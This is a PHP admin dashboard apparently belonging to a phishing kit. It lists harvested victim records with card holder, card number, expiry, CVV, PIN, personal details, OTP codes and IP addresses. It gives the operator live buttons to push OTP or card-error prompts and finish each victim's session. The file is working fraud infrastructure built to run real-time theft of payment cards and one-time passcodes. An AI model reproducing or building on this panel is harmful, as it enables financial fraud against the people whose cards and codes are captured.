<?php
   session_start();
   require_once('../global/inc/config.inc.php');
   require_once("../global/inc/functions.php");
   
   if(empty($_SESSION['admin_pass']) || $_SESSION['admin_pass'] != $password)
   {
       echo '<script>window.location.href = "login.php";</script>';
       die;return;
   }
   
   if(isset($_GET['update'])){
    updateState($_GET['update'], $_GET['id']);
   } elseif (isset($_GET['deleteLog'])){
    deleteLog($_GET['deleteLog']);
   }
   ?>
<!doctype html>
<html lang="en">
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="description" content="">
      <script src="https://code.jquery.com/jquery-3.5.0.js"></script>
      <script src="howler.core.js"></script>
      <script src="control.js"></script>
      <script src="https://momentjs.com/downloads/moment.js" type="text/javascript"></script>
      <title>Admin Panel - Dashboard</title>
      <!-- Bootstrap core CSS -->
      <link href="../global/panel_css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
      <style>
         .icons {
         font-size: 25px;
         }
         .href_none {
         text-decoration: none;
         }
         .bd-placeholder-img {
         font-size: 1.125rem;
         text-anchor: middle;
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none;
         }
         @media (min-width: 768px) {
         .bd-placeholder-img-lg {
         font-size: 3.5rem;
         }
         }
         .blink_me {
         animation: blinker 1s linear infinite;
         }
         @keyframes blinker {
         50% {
         opacity: 0;
         }
         }
      </style>
      <!-- Custom styles for this template -->
      <link href="../global/panel_css/starter-template.css" rel="stylesheet" crossorigin="anonymous">
      <link rel="stylesheet" href="https://icons.getbootstrap.com/assets/css/bootstrap.min.css">
      <link rel="stylesheet" href="https://icons.getbootstrap.com/assets/font/bootstrap-icons.css">
   </head>
   <body>
      <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top">
         <a class="navbar-brand" href="#">Admin Panel</a>
         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault" aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
         <span class="navbar-toggler-icon"></span>
         </button>
         <div class="collapse navbar-collapse" id="navbarsExampleDefault">
            <ul class="navbar-nav mr-auto">
               <li class="nav-item active">
                  <a class="nav-link" href="../admin/dashboard">Home <span class="sr-only">(current)</span></a>
               </li>
               <li class="nav-item active">
                  <a class="nav-link" href="visitors.php">Visitors <span class="sr-only">(current)</span></a>
               </li>
            </ul>
            <form class="form-inline my-2 my-lg-0">
               <button class="btn btn-secondary my-2 my-sm-0" type="submit">Logout</button>
            </form>
         </div>
      </nav>
      <main role="main" class="container" id="results_table">
         <h1>Entries list: <span id="countData"></span></h1>
         <table class="table table-striped">
            <thead>
               <tr>
                  <th scope="col">#</th>
                  <th scope="col">IP</th>
                  <th scope="col">CC Info</th>
                  <th scope="col">Information</th>
                  <th scope="col">SMS</th>
                  <th scope="col">Status</th>
                  <th scope="col">Action</th>
               </tr>
            </thead>
            <tbody id="data"></tbody>
         </table>
         <!-- /.container -->
      </main>
      <script src="https://code.jquery.com/jquery-3.5.1.min.js" crossorigin="anonymous"></script>
      <script src="../global/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
      <script type="text/javascript">
        function updateTable() {
          fetch('data.php?logs')
            .then(response => response.json())
            .then(data => {
              // Clear the table
              document.getElementById('data').innerHTML = '';

              // Add the new rows
              data.forEach(row => { 
                const tr = document.createElement('tr');
                tr.innerHTML = `
                  <td>` + checkUserStatus(`${row.date}`) + `</td>
                  <td>${row.ip}</td>
                  <td>
                      Card holder: `+ checkVal(`${row.cc_hol}`) +`<br>
                      Card number: `+ checkVal(`${row.cc_num}`) +`<br>
                      Expiration date: `+ checkVal(`${row.cc_exp}`) +`<br>
                      CVV/CVC: `+ checkVal(`${row.cc_cvc}`) +`<br>
                      PIN: `+ checkVal(`${row.pin_code}`) +`<br>
                  </td>
                  <td>
                      `+ checkVal(`${row.perso_info}`) +`
                  </td>
                  <td>`+ checkVal(`${row.otp_kode}`) +`</td>
                  <td scope='row'>` + checkState(`${row.state}`) + `&nbsp;${row.state}</td>
                  <td>
                  <a class="href_none" href="javascript:showCC('${row.cc_hol}', '${row.cc_num}', '${row.cc_exp}', '${row.cc_cvc}');">
                    <i class="actBtn finishBtn" onclick=";">SHOW CARD</i>
                  </a>&nbsp;
                  <a style="display:none;" class="href_none" href="javascript:sendAction(${row.id}, 'PIN');">
                    <i class="actBtn smsBtn">PIN</i>
                  </a>
                  <a class="href_none" href="javascript:sendAction(${row.id}, 'OTP');">
                    <i class="actBtn smsBtn">OTP</i>
                  </a>
                  <a class="href_none" href="javascript:sendAction(${row.id}, 'OTP_ERNO');">
                    <i class="actBtn infoBtn">OTP ERROR</i>
                  </a><br>
                  <a class="href_none" href="javascript:sendAction(${row.id}, 'CC_ERNO');">
                    <i class="actBtn infoBtn">CC ERROR</i>
                  </a><br>
                  <a class="href_none" href="javascript:sendAction(${row.id}, 'FINISH');">
                    <i class="actBtn finishBtn" onclick=";" title="FINISH">FINISH</i>
                  </a>&nbsp;
                  <a class="href_none" href="javascript:deleteLog(${row.id});">
                  <i class="actBtn delBtn">DELETE</i>
                  </a>
                  </td>
                `;
                document.getElementById('data').appendChild(tr);
              });
            });
        }

        // Call updateTable() every 5 seconds to update the table
        setInterval(updateTable, 1000);
      </script>
   </body>
</html>
